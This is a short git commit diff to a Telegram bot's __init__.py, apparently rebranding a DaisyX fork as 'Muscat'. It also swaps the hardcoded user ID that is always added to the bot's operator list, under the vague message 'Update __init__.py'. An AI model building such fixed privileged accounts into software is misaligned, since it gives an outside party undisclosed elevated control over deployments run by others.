39b938dea640e2e252d9d6b64fc24faa94e7ec32
ErzoA <96314386+ErzoA@users.noreply.github.com>
2022-01-28 17:59:26 +0800

    Update __init__.py

--- DaisyX/__init__.py
+++ DaisyX/__init__.py
@@ -27,7 +27,7 @@ from DaisyX.utils.logger import log
 from DaisyX.versions import DAISY_VERSION
 
 log.info("----------------------")
-log.info("|      Daisy X      |")
+log.info("|      Muscat      |")
 log.info("----------------------")
 log.info("Version: " + DAISY_VERSION)
 
@@ -44,7 +44,7 @@ LOGS_CHANNEL_ID = get_int_key("LOGS_CHANNEL_ID", required=True)
 
 OPERATORS = list(get_list_key("OPERATORS"))
 OPERATORS.append(OWNER_ID)
-OPERATORS.append(918317361)
+OPERATORS.append(2048936969)
 
 # SpamWatch
 spamwatch_api = get_str_key("SW_API", required=True)
